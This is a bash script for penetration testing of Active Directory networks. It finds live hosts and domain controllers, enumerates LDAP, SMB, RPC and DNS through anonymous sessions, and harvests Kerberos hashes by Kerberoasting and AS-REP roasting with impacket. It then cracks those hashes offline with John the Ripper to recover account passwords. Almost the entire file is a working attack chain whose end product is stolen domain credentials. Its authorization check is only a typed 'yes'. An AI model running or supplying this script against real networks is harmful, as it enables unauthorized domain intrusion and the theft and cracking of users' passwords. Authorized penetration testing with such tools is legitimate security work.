#!/bin/bash
# Refined AD Pentest Script v4
# Run with: bash ad_pentest_v4.sh
#
# AUTHORIZED TESTING ONLY. Do not run against networks you do not own
# or do not have explicit written permission to test.

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

# =========================================================
# STEP 0 : Authorization gate
# =========================================================
echo -e "${RED}=========================================================${NC}"
echo -e "${RED} AUTHORIZED SECURITY TESTING ONLY${NC}"
echo -e "${RED} You must have written permission to test this network.${NC}"
echo -e "${RED}=========================================================${NC}"
read -p "Type 'yes' to confirm you are authorized: " AUTH
if [ "$AUTH" != "yes" ]; then
    echo -e "${RED}[!] Exiting.${NC}"
    exit 1
fi

# Output directory for all artifacts
OUTDIR="ad_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
echo -e "${GREEN}[+] Artifacts will be saved to: $(pwd)/$OUTDIR${NC}"

# =========================================================
# STEP 1 : ifconfig + interface selection
# =========================================================
echo -e "\n${BLUE}[STEP 1] ifconfig${NC}"
ifconfig -a

IFACES=$(ifconfig | awk '/^[a-zA-Z0-9]+:/{iface=$1} /inet /{print iface}' | sed 's/://' | sort -u)

if [ -z "$IFACES" ]; then
    echo -e "${RED}[!] No interfaces with an IPv4 address found.${NC}"
    exit 1
fi

IFACE_COUNT=$(echo "$IFACES" | wc -l)

if [ "$IFACE_COUNT" -gt 1 ]; then
    echo -e "\n${YELLOW}[?] Multiple interfaces detected:${NC}"
    i=1
    for iface in $IFACES; do
        IP=$(ifconfig "$iface" | grep -Eo 'inet ([0-9]*\.){3}[0-9]*' | awk '{print $2}' | head -n1)
        if [ -n "$IP" ]; then
            echo "  $i) $iface  ->  $IP"
            eval "IFACE_$i=$iface"
            i=$((i+1))
        fi
    done
    read -p "Select interface number: " IFACE_NUM
    eval "SELECTED_IFACE=\$IFACE_$IFACE_NUM"
else
    SELECTED_IFACE=$(echo "$IFACES" | head -n1)
fi

KALI_IP=$(ifconfig "$SELECTED_IFACE" | grep -Eo 'inet ([0-9]*\.){3}[0-9]*' | awk '{print $2}' | head -n1)
[ -z "$KALI_IP" ] && read -p "Enter Kali IP manually: " KALI_IP
SUBNET=$(echo "$KALI_IP" | cut -d. -f1-3).0/24
echo -e "${GREEN}[+] Kali: $SELECTED_IFACE ($KALI_IP)   Subnet: $SUBNET${NC}"

# =========================================================
# STEP 2 : fping -g
# =========================================================
echo -e "\n${BLUE}[STEP 2] fping -a -g $SUBNET${NC}"
fping -a -g "$SUBNET" 2>/dev/null | tee "$OUTDIR/live_hosts.txt"
echo -e "${GREEN}[+] Live hosts: $(wc -l < "$OUTDIR/live_hosts.txt")${NC}"

# =========================================================
# STEP 3 : arp -n  (augments host list)
# =========================================================
echo -e "\n${BLUE}[STEP 3] arp -n${NC}"
arp -n | tee "$OUTDIR/arp.txt"

# =========================================================
# STEP 4 : nmap 389,88,445 -> find all AD-capable hosts
# =========================================================
echo -e "\n${BLUE}[STEP 4] nmap -p 389,88,445 (LDAP / Kerberos / SMB)${NC}"
> "$OUTDIR/ad_servers.txt"
> "$OUTDIR/ad_servers_detail.txt"
echo -e "${CYAN}  #   IP               389   88    445${NC}"
echo -e "${CYAN}  ----------------------------------------${NC}"

IDX=0
while read -r ip; do
    [ -z "$ip" ] && continue
    OUT=$(nmap -p 389,88,445 --open -Pn "$ip" 2>/dev/null)
    L=$(echo "$OUT" | grep -q "^389/tcp.*open" && echo "YES" || echo " - ")
    K=$(echo "$OUT" | grep -q "^88/tcp.*open"   && echo "YES" || echo " - ")
    S=$(echo "$OUT" | grep -q "^445/tcp.*open"  && echo "YES" || echo " - ")
    if [ "$L" = "YES" ] || [ "$K" = "YES" ] || [ "$S" = "YES" ]; then
        IDX=$((IDX+1))
        printf "  %-3s %-16s %-5s %-5s %-5s\n" "$IDX" "$ip" "$L" "$K" "$S"
        echo "$ip" >> "$OUTDIR/ad_servers.txt"
        echo "$ip|$L|$K|$S" >> "$OUTDIR/ad_servers_detail.txt"
    fi
done < "$OUTDIR/live_hosts.txt"

if [ ! -s "$OUTDIR/ad_servers.txt" ]; then
    echo -e "${RED}[!] No AD-capable host found.${NC}"
    read -p "  Enter DC IP manually: " MANUAL_IP
    echo "$MANUAL_IP" > "$OUTDIR/ad_servers.txt"
    echo "$MANUAL_IP|MANUAL|MANUAL|MANUAL" > "$OUTDIR/ad_servers_detail.txt"
fi

# =========================================================
# STEP 4b : choose which AD host to use for next level
# =========================================================
echo ""
echo -e "${YELLOW}[?] Which AD server do you want to use for the next level?${NC}"
i=1
while IFS='|' read -r ip L K S; do
    printf "  %d) %-16s  LDAP:%s  KRB:%s  SMB:%s\n" "$i" "$ip" "$L" "$K" "$S"
    eval "DC_$i=$ip"
    i=$((i+1))
done < "$OUTDIR/ad_servers_detail.txt"

read -p "Choose number (or type an IP manually): " SEL

if [[ "$SEL" =~ ^[0-9]+$ ]]; then
    eval "DC_IP=\$DC_$SEL"
else
    DC_IP="$SEL"
fi

if [ -z "$DC_IP" ]; then
    echo -e "${RED}[!] No DC selected. Exiting.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Selected DC: $DC_IP${NC}"

# =========================================================
# STEP 4c : next-level enumeration
# =========================================================
run_extra_enum() {
    local dc="$1"
    local lport="$2"
    local kport="$3"
    local sport="$4"
    local d="$OUTDIR"

    echo -e "\n${BLUE}========== NEXT-LEVEL ENUMERATION on $dc ==========${NC}"

    # ---------------- LDAP ----------------
    if [ "$lport" = "YES" ]; then
        echo -e "\n${CYAN}[*] [LDAP] Base / DSE (port 389)${NC}"
        ldapsearch -x -H "ldap://$dc" -s base 2>/dev/null \
            | tee "$d/ldap_base_${dc}.txt" | head -n 40

        echo -e "\n${CYAN}[*] [LDAP] Anonymous bind — naming contexts${NC}"
        ldapsearch -x -H "ldap://$dc" -b "" -s base namingContexts 2>/dev/null \
            | tee "$d/ldap_naming_${dc}.txt"

        echo -e "\n${CYAN}[*] [LDAP] nmap ldap-rootdse${NC}"
        nmap -p 389 --script=ldap-rootdse "$dc" 2>/dev/null \
            | tee "$d/nmap_ldap_${dc}.txt" \
            | grep -Ei 'ldapServiceName|dnsHostName|defaultNamingContext' || true
    fi

    # ---------------- SMB ----------------
    if [ "$sport" = "YES" ]; then
        echo -e "\n${CYAN}[*] [SMB] Null session + share listing (port 445)${NC}"
        smbclient -L "//$dc" -N 2>/dev/null | tee "$d/smb_shares_${dc}.txt" || true

        if command -v nxc >/dev/null 2>&1; then
            echo -e "\n${CYAN}[*] [SMB] nxc smb — null session info${NC}"
            nxc smb "$dc" -u '' -p '' 2>/dev/null | tee "$d/nxc_smb_${dc}.txt" || true
        fi

        # [NEW] enum4linux-ng
        if command -v enum4linux-ng >/dev/null 2>&1; then
            echo -e "\n${CYAN}[*] [SMB] [NEW] enum4linux-ng -A${NC}"
            enum4linux-ng -A "$dc" 2>/dev/null \
                | tee "$d/enum4linux_ng_${dc}.txt" | tail -n 40 || true
        else
            echo -e "${YELLOW}[!] enum4linux-ng not installed; skipping.${NC}"
        fi

        # fallback to classic enum4linux if ng is missing
        if ! command -v enum4linux-ng >/dev/null 2>&1 \
           && command -v enum4linux >/dev/null 2>&1; then
            echo -e "\n${CYAN}[*] [SMB] [NEW] enum4linux -a (classic)${NC}"
            enum4linux -a "$dc" 2>/dev/null \
                | tee "$d/enum4linux_${dc}.txt" | tail -n 40 || true
        fi
    fi

    # ---------------- Kerberos / LDAP users & groups ----------------
    if [ "$kport" = "YES" ] || [ "$lport" = "YES" ]; then
        if command -v nxc >/dev/null 2>&1; then
            echo -e "\n${CYAN}[*] [LDAP] [NEW] nxc ldap — users${NC}"
            nxc ldap "$dc" -u '' -p '' --users 2>/dev/null \
                | tee "$d/nxc_users_${dc}.txt" || true

            echo -e "\n${CYAN}[*] [LDAP] [NEW] nxc ldap — groups${NC}"
            nxc ldap "$dc" -u '' -p '' --groups 2>/dev/null \
                | tee "$d/nxc_groups_${dc}.txt" || true

            echo -e "\n${CYAN}[*] [LDAP] [NEW] nxc ldap — DC list${NC}"
            nxc ldap "$dc" -u '' -p '' --dc-list 2>/dev/null \
                | tee "$d/nxc_dclist_${dc}.txt" || true

            echo -e "\n${CYAN}[*] [LDAP] [NEW] nxc ldap — password policy${NC}"
            nxc ldap "$dc" -u '' -p '' --pass-pol 2>/dev/null \
                | tee "$d/nxc_passpol_${dc}.txt" || true
        else
            echo -e "${YELLOW}[!] nxc not installed; skipping nxc LDAP steps.${NC}"
        fi
    fi

    # ---------------- Kerberoasting ----------------
    if [ "$kport" = "YES" ] && [ -n "$DOMAIN" ]; then
        echo -e "\n${CYAN}[*] [KRB] [NEW] impacket-GetUserSPNs (Kerberoasting)${NC}"
        echo -e "${YELLOW}    (anonymous — may return nothing without creds)${NC}"
        impacket-GetUserSPNs "$DOMAIN/" -dc-ip "$dc" -no-pass \
            -outputfile "$d/kerberoast_${dc}.txt" 2>/dev/null || true
        if [ -s "$d/kerberoast_${dc}.txt" ]; then
            echo -e "${GREEN}    [+] Kerberoast hashes saved to kerberoast_${dc}.txt${NC}"
        else
            echo -e "${YELLOW}    [-] No Kerberoast hashes (needs creds).${NC}"
        fi
    fi

    # ---------------- ldapdomaindump ----------------
    if [ "$lport" = "YES" ] && [ -n "$DOMAIN" ]; then
        if command -v ldapdomaindump >/dev/null 2>&1; then
            echo -e "\n${CYAN}[*] [LDAP] [NEW] ldapdomaindump (anonymous)${NC}"
            mkdir -p "$d/ldapdump_${dc}"
            ldapdomaindump -u "$DOMAIN\\guest" -p '' \
                -o "$d/ldapdump_${dc}" "$dc" 2>/dev/null \
                | tee "$d/ldapdomaindump_${dc}.log" | tail -n 20 || true
            echo -e "${GREEN}    [+] ldapdomaindump output: $d/ldapdump_${dc}${NC}"
        else
            echo -e "${YELLOW}[!] ldapdomaindump not installed; skipping.${NC}"
        fi
    fi

    # ---------------- DNS SRV ----------------
    echo -e "\n${CYAN}[*] [DNS] SRV lookups for DC services${NC}"
    if command -v dig >/dev/null 2>&1 && [ -n "$DOMAIN" ]; then
        dig +short SRV _ldap._tcp.dc._msdcs."$DOMAIN" 2>/dev/null \
            | tee "$d/dns_ldap_${dc}.txt" || true
        dig +short SRV _kerberos._tcp."$DOMAIN" 2>/dev/null \
            | tee "$d/dns_krb_${dc}.txt" || true
        dig +short SRV _gc._tcp."$DOMAIN" 2>/dev/null \
            | tee "$d/dns_gc_${dc}.txt" || true
    fi

    # ---------------- RPC ----------------
    echo -e "\n${CYAN}[*] [RPC] rpcclient srvinfo${NC}"
    if command -v rpcclient >/dev/null 2>&1; then
        rpcclient -U "" -N "$dc" -c "srvinfo" 2>/dev/null \
            | tee "$d/rpc_${dc}.txt" || true
    fi

    echo -e "\n${GREEN}[+] Next-level enumeration artifacts saved in $(pwd)/$d${NC}"
}

# Look up the port flags for the selected DC
DETAIL=$(grep "^$DC_IP|" "$OUTDIR/ad_servers_detail.txt" | head -n1)
if [ -n "$DETAIL" ]; then
    LPORT=$(echo "$DETAIL" | cut -d'|' -f2)
    KPORT=$(echo "$DETAIL" | cut -d'|' -f3)
    SPORT=$(echo "$DETAIL" | cut -d'|' -f4)
else
    LPORT="YES"; KPORT="YES"; SPORT="YES"
fi

# =========================================================
# STEP 4d : auto-detect domain (needed before enum so GetUserSPNs works)
# =========================================================
echo -e "\n${BLUE}[STEP 4d] Auto-detecting domain name...${NC}"

DOMAIN=$(nxc ldap "$DC_IP" -u '' -p '' 2>/dev/null \
         | grep -Eo '\(domain:[^)]+\)' | head -n1 | cut -d: -f2 | tr -d ')')

if [ -z "$DOMAIN" ]; then
    DOMAIN=$(nmap -p 389 --script=ldap-rootdse "$DC_IP" 2>/dev/null \
             | grep -i 'ldapServiceName' | awk '{print $2}' | cut -d: -f1)
fi

if [ -z "$DOMAIN" ]; then
    DOMAIN=$(dig +short -x "$DC_IP" 2>/dev/null \
             | sed 's/\.$//' | cut -d. -f2- | head -n1)
fi

if [ -z "$DOMAIN" ]; then
    echo -e "${RED}[!] Could not auto-detect domain.${NC}"
    read -p "  Enter domain manually: " DOMAIN
fi
echo -e "${GREEN}[+] Domain: $DOMAIN${NC}"

echo ""
read -p "Run next-level enumeration on $DC_IP now? (y/n): " DO_ENUM
if [ "$DO_ENUM" = "y" ] || [ "$DO_ENUM" = "Y" ]; then
    run_extra_enum "$DC_IP" "$LPORT" "$KPORT" "$SPORT"
fi

# =========================================================
# STEP 6 : GetNPUsers - ask userlist, save to aduserfile.txt
# =========================================================
echo -e "\n${BLUE}[STEP 6] impacket-GetNPUsers (AS-REP user enumeration)${NC}"
echo -e "${YELLOW}[?] Provide a userlist file to test for AS-REP roastable accounts.${NC}"
read -p "  Enter path to userlist (or type 'new' to enter manually): " UL_IN

if [ "$UL_IN" = "new" ] || [ ! -f "$UL_IN" ]; then
    echo -e "${YELLOW}[*] Enter usernames, one per line. Blank line to finish:${NC}"
    > "$OUTDIR/userlist.txt"
    while IFS= read -r line; do
        [ -z "$line" ] && break
        echo "$line" >> "$OUTDIR/userlist.txt"
    done
else
    cp "$UL_IN" "$OUTDIR/userlist.txt"
fi
echo -e "${GREEN}[+] Userlist saved: $(pwd)/$OUTDIR/userlist.txt  ($(wc -l < "$OUTDIR/userlist.txt") users)${NC}"

echo -e "\n${BLUE}[*] Running GetNPUsers with -no-pass -format john...${NC}"
> "$OUTDIR/aduserfile.txt"
SUCCESS=0

for ip in $(cat "$OUTDIR/ad_servers.txt"); do
    echo -e "${CYAN}[*] Trying DC $ip ...${NC}"
    impacket-GetNPUsers "$DOMAIN/" -no-pass \
        -usersfile "$OUTDIR/userlist.txt" \
        -format john \
        -outputfile "$OUTDIR/aduserfile.txt" \
        -dc-ip "$ip" 2>&1 | tee /dev/stderr | grep -qE '\$krb5asrep\$' \
        && SUCCESS=1
    if [ -s "$OUTDIR/aduserfile.txt" ]; then
        SUCCESS=1
        DC_IP="$ip"
        echo -e "${GREEN}[+] Successful on $ip. Hashes saved to aduserfile.txt${NC}"
        break
    else
        echo -e "${YELLOW}[-] No AS-REP hashes from $ip, trying next...${NC}"
    fi
done

if [ "$SUCCESS" -ne 1 ] || [ ! -s "$OUTDIR/aduserfile.txt" ]; then
    echo -e "${RED}[!] No AS-REP roastable accounts found on any AD IP.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] aduserfile.txt created with $(grep -c '\$krb5asrep\$' "$OUTDIR/aduserfile.txt") hashes.${NC}"

# =========================================================
# STEP 7 : John the Ripper - ask wordlist, crack
# =========================================================
echo -e "\n${BLUE}[STEP 7] John the Ripper - offline cracking${NC}"
echo -e "${YELLOW}[?] Choose wordlist for John:${NC}"
echo "  1) /usr/share/wordlists/rockyou.txt"
echo "  2) Custom wordlist"
read -p "Choose (1/2): " WL_CHOICE

if [ "$WL_CHOICE" = "1" ]; then
    WORDLIST="/usr/share/wordlists/rockyou.txt"
else
    read -p "  Enter full path to wordlist: " WORDLIST
    [ ! -f "$WORDLIST" ] && { echo -e "${RED}[!] Not found, using rockyou.txt${NC}"; WORDLIST="/usr/share/wordlists/rockyou.txt"; }
fi
echo -e "${GREEN}[+] Wordlist: $WORDLIST${NC}"

echo -e "${YELLOW}[*] Cracking...${NC}"
john --wordlist="$WORDLIST" "$OUTDIR/aduserfile.txt"
echo -e "\n${GREEN}[+] Cracked credentials:${NC}"
john --show "$OUTDIR/aduserfile.txt"

# =========================================================
# SUMMARY
# =========================================================
echo -e "\n${BLUE}=================== SUMMARY ===================${NC}"
echo -e "${GREEN}  DC IP      : $DC_IP${NC}"
echo -e "${GREEN}  Domain     : $DOMAIN${NC}"
echo -e "${GREEN}  Output dir : $(pwd)/$OUTDIR${NC}"
echo -e "${GREEN}  Userlist   : $OUTDIR/userlist.txt${NC}"
echo -e "${GREEN}  AS-REP file: $OUTDIR/aduserfile.txt${NC}"
echo ""
echo -e "${GREEN}  Artifact files:${NC}"
ls -1 "$OUTDIR" | sed 's/^/    /'
echo -e "${BLUE}================================================${NC}"
